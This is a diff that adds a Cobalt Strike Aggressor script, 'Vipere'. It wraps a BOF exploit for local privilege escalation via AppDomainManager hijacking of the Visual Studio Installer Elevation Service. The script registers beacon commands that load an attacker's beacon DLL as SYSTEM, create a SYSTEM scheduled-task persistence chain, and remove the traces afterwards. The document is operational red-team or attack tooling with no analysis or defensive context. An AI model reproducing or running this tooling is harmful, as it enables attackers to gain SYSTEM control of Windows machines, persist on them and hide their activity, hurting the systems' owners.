@@ -1,0 +1,118 @@
+# Vipere - VS Installer LPE via AppDomainManager Hijacking
+# CobaltStrike Aggressor Script
+
+beacon_command_register(
+    "vipere-check",
+    "Detect service + persistence state",
+    "Synopsis: vipere-check\n\nDetects VS Installer Elevation Service state and persistence artifacts.\nNo arguments required."
+);
+
+beacon_command_register(
+    "vipere-prepare",
+    "Download VS Installer from microsoft.com",
+    "Synopsis: vipere-prepare\n\nDownloads vs_BuildTools.exe from aka.ms and registers the service.\nRequires: Admin, Internet access."
+);
+
+beacon_command_register(
+    "vipere-exploit",
+    "AppDomainManager hijack service -> SYSTEM",
+    "Synopsis: vipere-exploit /path/to/beacon.dll\n\nDeploys AppDomainManager hijack on the VS Installer service.\nLoads beacon DLL as SYSTEM via LoadLibrary in-process.\nRequires: Admin, service must exist."
+);
+
+beacon_command_register(
+    "vipere-persist",
+    "Scheduled task + AppDomainManager persistence",
+    "Synopsis: vipere-persist /path/to/beacon.dll\n\nCopies vs_installershell.exe to ProgramData, deploys AppDomainManager chain,\ncreates scheduled task (logon trigger, runs as SYSTEM).\nRequires: Admin."
+);
+
+beacon_command_register(
+    "vipere-full",
+    "Full auto: prepare + exploit + persist",
+    "Synopsis: vipere-full /path/to/beacon.dll\n\nOne-shot: downloads VS Installer, deploys AppDomainManager hijack,\ncreates persistence. Beacon loaded as SYSTEM.\nRequires: Admin, Internet access."
+);
+
+beacon_command_register(
+    "vipere-cleanup",
+    "Stop service + remove all artifacts + restore originals",
+    "Synopsis: vipere-cleanup\n\nStops service, kills persist process, removes all dropped files,\nrestores original .config from backup.\nRequires: Admin."
+);
+
+sub _vipere_bof {
+    local('$handle $data');
+    $handle = openf(script_resource("dist/lpe_vs_bootstrap.x64.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+    return $data;
+}
+
+alias vipere-check {
+    local('$data $args');
+    $data = _vipere_bof();
+    $args = bof_pack($1, "z", "check");
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+alias vipere-prepare {
+    local('$data $args');
+    $data = _vipere_bof();
+    $args = bof_pack($1, "z", "prepare");
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+alias vipere-exploit {
+    local('$data $args $dll_handle $dll_data');
+
+    if ($2 eq "") {
+        berror($1, "Usage: vipere-exploit /path/to/beacon.dll");
+        return;
+    }
+
+    $dll_handle = openf($2);
+    $dll_data = readb($dll_handle, -1);
+    closef($dll_handle);
+
+    $data = _vipere_bof();
+    $args = bof_pack($1, "zb", "exploit", $dll_data);
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+alias vipere-persist {
+    local('$data $args $dll_handle $dll_data');
+
+    if ($2 eq "") {
+        berror($1, "Usage: vipere-persist /path/to/beacon.dll");
+        return;
+    }
+
+    $dll_handle = openf($2);
+    $dll_data = readb($dll_handle, -1);
+    closef($dll_handle);
+
+    $data = _vipere_bof();
+    $args = bof_pack($1, "zb", "persist", $dll_data);
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+alias vipere-full {
+    local('$data $args $dll_handle $dll_data');
+
+    if ($2 eq "") {
+        berror($1, "Usage: vipere-full /path/to/beacon.dll");
+        return;
+    }
+
+    $dll_handle = openf($2);
+    $dll_data = readb($dll_handle, -1);
+    closef($dll_handle);
+
+    $data = _vipere_bof();
+    $args = bof_pack($1, "zb", "full", $dll_data);
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+alias vipere-cleanup {
+    local('$data $args');
+    $data = _vipere_bof();
+    $args = bof_pack($1, "z", "cleanup");
+    beacon_inline_execute($1, $data, "go", $args);
+}
